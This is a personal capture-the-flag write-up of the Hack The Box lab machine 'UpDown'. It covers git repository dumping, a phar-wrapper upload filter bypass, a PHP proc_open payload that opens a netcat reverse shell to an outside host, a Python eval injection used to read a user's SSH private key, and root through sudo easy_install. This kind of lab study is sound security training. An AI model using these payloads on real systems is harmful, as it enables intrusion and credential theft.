---
title: UpDown
updated: 2024-10-24 14:57:22Z
created: 2024-10-24 09:36:03Z
latitude: 51.41604000
longitude: -0.75398000
altitude: 0.0000
---

# Initial Scan

```bash
Nmap scan report for 10.10.11.177
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```

Visiting the website shows siteisup.htb. Something we can add to the /etc/hosts file.

&nbsp;

&nbsp;

&nbsp;

# Siteisup SSRF?

Wfuzz shows us a forbidden response from the dev.siteisup.htb subdomain.

![524e34187ff654c529076f701abf33da.png](../../../../../_resources/524e34187ff654c529076f701abf33da.png)

Perhaps we can use the siteisup check with debug mode to get information about that subdomain.

Enumerating via feroxbuster shows a .git repository in the /dev subdirectory (make sure to add .git to all wordlists.).

I used gitdumper to grab the .git directory:

```bash
python3 git_dumper.py http://siteisup.htb/dev/ .git

```

There is a message in the changelog regarding an upload feature.

Git log showed a number of potentially interesting changes:

```text
010dcc30cc1e89344e2bdbd3064f61c772d89a34
c8fcc4032487eaf637d41486eb150b7182ecd1f1
f67efd00c10784ae75bd251add3d52af50d7addd
ab9bc164b4103de3c12ac97152e6d63040d5c4c6
60d2b3280d5356fe0698561e8ef8991825fec6cb
c1998f8fbe683dd0bee8d94167bb896bd926c4c7
35a380176ff228067def9c2ecc52ccfe705de640
57af03ba60cdcfe443e92c33c188c6cecb70eb10
354fe069f6205af09f26c99cfe2457dea3eb6a6c
8812785e31c879261050e72e20f298ae8c43b565
bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
61e5cc0550d44c08b6c316d4f04d3fcc7783ae71
3d66cd48933b35f4012066bcc7ee8d60f0069926
6f89af70fd23819664dd28d764f13efc02ecfd88
8d1beb1cf5a1327c4cdb271b8efb1599b1b1c87f
6ddcc7a8ac393edb7764788c0cbc13a7a521d372
```

One refers to a file called checker.php which appears to check the size of the uploaded file, along with monitoring for if the given extension is allowed to be uploaded.

The full code for checker is viewable, but I'm unsure as to how you actually upload a file.

![a82e6345ce68f4fc22b00e5e261c4ca9.png](../../../../../_resources/a82e6345ce68f4fc22b00e5e261c4ca9.png)

Interesting. Perhaps by adding this header we can access the dev subdomain.

&nbsp;

&nbsp;

# Dev Subdomain (Execution via Phar PHP Wrapper)

I added the Special-Dev header and accessed the dev subdomain where I can now upload a file from which the system takes the file contents and basically pings those addresses.

There doesn't appear to be any command injection and judging from the contents of uploads the file is deleted afterwards, however the directory stays:

![90e3072791db782640b775868c9088ff.png](../../../../../_resources/90e3072791db782640b775868c9088ff.png)

The allowed extensions are shown in the .git repo:

```php
+       # Check if extension is allowed.
+       $ext = getExtension($file);
+       if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
+               die("Extension not allowed!");
```

Using the phar format, we can achieve some form of execution via uploading a zip file without the zip extension and then using the phar wrapper.

We also can view admin.php via the .git repo and see that .php extension is added on the end of the page parameter value:

![34cdaa791865d4245affc0cefdedc812.png](../../../../../_resources/34cdaa791865d4245affc0cefdedc812.png)

We can use the phar wrapper to view our .zip archive and our reverse shell inside which we uploaded (with a different extension). Due to admin.php adding .php on the end of any value given in the page parameter any file we zip up will be executable as php code, allowing us to run php-reverse-shell.php, avoiding the filter entirely via:

```bash
http://dev.siteisup.htb/?page=phar://uploads/ac12e1fe4e5c80d8fcd97c4f179f71b8/php-reverse-shell.xyz/php-reverse-shell
```

This is after uploading the php-reverse-shell.xyz zip file to the site so it won't be removed instantly, then using phar and the page parameter to attempt to execute it, however it failed to daemonise.

As reverse shell didn't work, I zipped up and uploaded a new php file which would show the result of the phpinfo() function. This was useful in seeing disabled functions:

```bash
http://dev.siteisup.htb/?page=phar://uploads/59bff79e9a067c7053842ba0e8843898/info.xyz/info
```

![2a7ca27a918580c73ac9524cb33dcc58.png](../../../../../_resources/2a7ca27a918580c73ac9524cb33dcc58.png)

So this is why the reverse shell was working, and neither was shell_exec.

It looks like proc_open is available however, so I used this:

```php
<?php
// descriptor array
$desc = array(
    0 => array('pipe', 'r'), // 0 is STDIN for process
    1 => array('pipe', 'w'), // 1 is STDOUT for process
    2 => array('file', '/tmp/error-output.txt', 'a') // 2 is STDERR for process
);

$cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.10 4444 >/tmp/f";

// spawn the process
$p = proc_open($cmd, $desc, $pipes);

// send the wiki content as input to the markup engine
// and then close the input pipe so the engine knows
// not to expect more input and can start processing
fwrite($pipes[0], $content);
fclose($pipes[0]);

// read the output from the engine
$html = stream_get_contents($pipes[1]);

// all done! Clean up
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($p);
```

Went through the process and accessed http://dev.siteisup.htb/?page=phar://uploads/67c782bf1ca54991084d95bc1cd8affa/wow.xyz/wow:

![683f725cc982ea1e8f027a6194d449a4.png](../../../../../_resources/683f725cc982ea1e8f027a6194d449a4.png)

&nbsp;

&nbsp;

# Other Method for Shell via PHP Filters (Very Useful)

There's a tool that essentially passes text into various PHP filters.

Essentially this tool passes an empty string into a long chain of filters to produce any output on the page. If this is php output, because it's an include, it will be executed.

https://github.com/synacktiv/php_filter_chain_generator

https://www.youtube.com/watch?v=TnLELBtmZ24

In the case of this box we can run:

```bash
python php_filter_chain_generator.py --chain '<?php echo "jest123"; ?>'
```

Then when we visit http://dev.siteisup.htb/?page=admin, we can replace admin with the chain the script gives us and we should see jest echoed onto the page.

This also means that proc_open would work doing this as well, simplifying the box.

&nbsp;

&nbsp;

# Privesc to Dev via Python2 Eval

I first ran some basic enumeration and found as a result of find / -perm -u=s -type f 2>/dev/null (find all suid binaries):

![8d09ad210d127709ce0a17c9d2b4675d.png](../../../../../_resources/8d09ad210d127709ce0a17c9d2b4675d.png)

/home/developer/dev/siteisup.

It is a python script that takes a url and pings it etc etc.

It has easy command injection, doesn't even require any special characters:

```bash
__import__('os').system('id')
```

![3c9a59df6d66b9de47b2a44c4e7e09d4.png](../../../../../_resources/3c9a59df6d66b9de47b2a44c4e7e09d4.png)

```bash
__import__('os').system('cat /home/developer/.ssh/id_rsa')
```

&nbsp;This gave me the private key and now I have access as developer.

&nbsp;

&nbsp;

# Privesc to Root (Easy_Install)

We have an entry in sudoers:

![fb97bcc1774776b2f08ef2a69ae9ff84.png](../../../../../_resources/fb97bcc1774776b2f08ef2a69ae9ff84.png)

Easy_Install is a deprecated way to install python packages, and it does this via running a python script you give it.

We can make a python script and point easy install at it and have it execute as root.

It has an entry on GTFOBins here https://gtfobins.github.io/gtfobins/easy_install/#sudo

So it's the easiest to root privesc ever:

![7b8eea72a30c300e66be42f451fed110.png](../../../../../_resources/7b8eea72a30c300e66be42f451fed110.png)

&nbsp;

&nbsp;